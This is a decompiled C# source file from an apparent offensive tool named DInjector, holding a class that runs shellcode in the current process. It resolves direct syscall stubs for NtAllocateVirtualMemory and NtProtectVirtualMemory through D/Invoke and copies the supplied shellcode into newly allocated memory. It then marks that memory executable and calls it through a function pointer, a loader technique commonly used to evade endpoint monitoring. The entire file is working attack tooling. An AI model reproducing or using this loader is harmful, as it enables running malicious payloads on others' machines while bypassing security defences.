using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x0200000C RID: 12
	internal class FunctionPointer
	{
		// Token: 0x0600002B RID: 43 RVA: 0x00003AB0 File Offset: 0x00001CB0
		public static void Execute(byte[] shellcodeBytes)
		{
			FunctionPointer.NtAllocateVirtualMemory ntAllocateVirtualMemory = (FunctionPointer.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtAllocateVirtualMemory"), typeof(FunctionPointer.NtAllocateVirtualMemory));
			IntPtr zero = IntPtr.Zero;
			IntPtr intPtr = (IntPtr)shellcodeBytes.Length;
			DInvoke.Data.Native.NTSTATUS ntstatus = ntAllocateVirtualMemory(Process.GetCurrentProcess().Handle, ref zero, IntPtr.Zero, ref intPtr, Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE, 4U);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(FunctionPointer) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
			}
			else
			{
				Console.WriteLine(string.Format("(FunctionPointer) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {0}", ntstatus));
			}
			Marshal.Copy(shellcodeBytes, 0, zero, shellcodeBytes.Length);
			uint num;
			ntstatus = ((FunctionPointer.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(FunctionPointer.NtProtectVirtualMemory)))(Process.GetCurrentProcess().Handle, ref zero, ref intPtr, 32U, out num);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(FunctionPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
			}
			else
			{
				Console.WriteLine(string.Format("(FunctionPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {0}", ntstatus));
			}
			((FunctionPointer.pFunction)Marshal.GetDelegateForFunctionPointer(zero, typeof(FunctionPointer.pFunction)))();
		}

		// Token: 0x0200003D RID: 61
		// (Invoke) Token: 0x06000086 RID: 134
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

		// Token: 0x0200003E RID: 62
		// (Invoke) Token: 0x0600008A RID: 138
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x0200003F RID: 63
		// (Invoke) Token: 0x0600008E RID: 142
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate void pFunction();
	}
}
